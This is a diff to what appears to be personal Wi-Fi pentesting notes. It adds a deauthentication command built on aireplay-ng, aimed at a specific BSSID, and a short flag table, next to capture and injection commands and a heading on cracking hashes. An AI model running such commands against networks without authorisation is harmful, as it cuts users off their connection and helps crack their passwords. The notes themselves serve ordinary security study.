@@ -38,6 +38,16 @@ sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w 1.cap
 sudo airmon-ng start wlan0 3 
 sudo aireplay-ng -9 wlan0mon
 ```
+### Deauth
+```
+sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38
+```
+|CMD|DESC|
+|-----|-----|
+-0 |# deauths
+-a|BSSID
+-c|client
+
 ## Aircrack-ng
 ### Cracking Hashes
 ```
